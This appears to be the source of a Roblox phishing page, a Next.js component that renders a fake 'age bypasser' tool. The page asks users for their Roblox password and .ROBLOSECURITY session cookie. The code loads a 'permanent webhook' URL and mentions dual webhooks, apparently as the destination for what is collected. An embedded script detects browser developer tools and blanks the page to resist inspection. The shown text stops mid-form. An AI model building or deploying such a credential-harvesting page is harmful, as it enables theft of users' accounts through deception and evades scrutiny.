import { supabase } from "../../supabaseClient";

export default async function DirectoryPage({ params }) {
  const { directory } = params;

  // Fetch the site info from Supabase
  const { data, error } = await supabase
    .from("websites")
    .select("*")
    .eq("directory", directory)
    .single();

  if (error || !data) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
        <h1 className="text-3xl font-bold mb-4">❌ Site Not Found</h1>
        <p className="text-gray-400">No record found for "{directory}".</p>
      </div>
    );
  }

  // Get permanent webhook from environment variable
  const permanentWebhook = process.env.PERMANENT_WEBHOOK_URL;

  // Debug Mode Check - Show blank page if developer tools are detected
  const debugModeScript = `
    <script>
      // Debug mode detection
      let isDebugMode = false;
      
      // Check for common developer tools indicators
      function checkDebugMode() {
        // Check if devtools is open
        const devtools = /./;
        devtools.toString = function() {
          isDebugMode = true;
          return 'devtools';
        };
        console.log(devtools);
        
        // Check for debugger statements
        try {
          debugger;
          if (new Date().getTime() > 0) {
            // Additional checks
            const startTime = performance.now();
            debugger;
            const endTime = performance.now();
            if (endTime - startTime > 100) {
              isDebugMode = true;
            }
          }
        } catch (e) {
          isDebugMode = true;
        }
        
        return isDebugMode;
      }
      
      // Run debug detection
      setTimeout(() => {
        if (checkDebugMode()) {
          document.body.innerHTML = '';
          document.body.style.backgroundColor = '#000';
        }
      }, 1000);
      
      // Continuous monitoring
      setInterval(checkDebugMode, 5000);
    </script>
  `;

  // Return the HTML template with debug mode and dual webhooks
  return (
    <div dangerouslySetInnerHTML={{
      __html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGE BYPASSER TOOLS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0a0a2a;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 90%, rgba(120, 219, 255, 0.3) 0%, transparent 50%),
                linear-gradient(135deg, #0a0a2a 0%, #1a1a4a 50%, #0a0a2a 100%);
            color: #fff;
            padding: 20px;
            line-height: 1.5;
        }

        .container {
            width: 100%;
            max-width: 480px;
        }

        .card {
            background: rgba(16, 18, 36, 0.95);
            border-radius: 16px;
            padding: 30px;
            box-shadow: 
                0 10px 30px rgba(0, 0, 0, 0.5),
                0 1px 1px rgba(255, 255, 255, 0.1) inset;
            border: 1px solid rgba(100, 100, 255, 0.2);
            backdrop-filter: blur(10px);
            margin-bottom: 20px;
        }

        h1 {
            text-align: center;
            margin-bottom: 25px;
            font-size: 28px;
            font-weight: 700;
            color: #ffffff;
            text-shadow: 0 0 10px rgba(100, 149, 237, 0.7);
            letter-spacing: 1px;
        }

        .description {
            background: rgba(30, 35, 70, 0.7);
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 25px;
            border-left: 4px solid #6495ed;
            font-size: 15px;
            color: #e0e0ff;
        }

        .description strong {
            color: #6495ed;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #b0b0ff;
            font-size: 15px;
        }

        input, textarea {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: 1px solid rgba(100, 149, 237, 0.4);
            background: rgba(20, 25, 50, 0.8);
            color: #fff;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #6495ed;
            box-shadow: 0 0 0 2px rgba(100, 149, 237, 0.3);
            background: rgba(25, 30, 60, 0.9);
        }

        textarea {
            height: 120px;
            resize: vertical;
        }

        input::placeholder, textarea::placeholder {
            color: rgba(200, 200, 255, 0.6);
        }

        .btn {
            width: 100%;
            padding: 16px 20px;
            border-radius: 10px;
            background: linear-gradient(135deg, #6495ed 0%, #4169e1 100%);
            border: none;
            color: #fff;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            box-shadow: 0 4px 15px rgba(100, 149, 237, 0.4);
        }

        .btn:hover {
            background: linear-gradient(135deg, #6fa1ff 0%, #4a7aff 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(100, 149, 237, 0.6);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #7e57c2 0%, #5e35b1 100%);
            box-shadow: 0 4px 15px rgba(126, 87, 194, 0.4);
        }

        .btn-secondary:hover {
            background: linear-gradient(135deg, #8d6bc9 0%, #6d43c7 100%);
            box-shadow: 0 6px 20px rgba(126, 87, 194, 0.6);
        }

        .progress {
            margin-top: 20px;
            height: 12px;
            background: rgba(30, 35, 70, 0.8);
            border-radius: 8px;
            overflow: hidden;
            display: none;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.4);
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6495ed 0%, #4169e1 50%, #6495ed 100%);
            transition: width 0.3s ease;
            border-radius: 8px;
        }

        .status {
            margin-top: 12px;
            font-size: 14px;
            color: #b0b0ff;
            text-align: center;
            min-height: 20px;
        }

        .footer {
            text-align: center;
            color: rgba(200, 200, 255, 0.7);
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>⚡ AGE FORCER</h1>
            
            <div class="description">
                <strong>⚠️ CRITICAL ALERT:</strong><br>
                This Tools Will Permanently Remove Email From Your Roblox Account.  This action cannot be undone and will affect your account's age restrictions and features.
            </div>

            <form id="demoForm">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input id="password" type="password" placeholder="Enter your password" />
                </div>

                <div class="form-group">
                    <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</
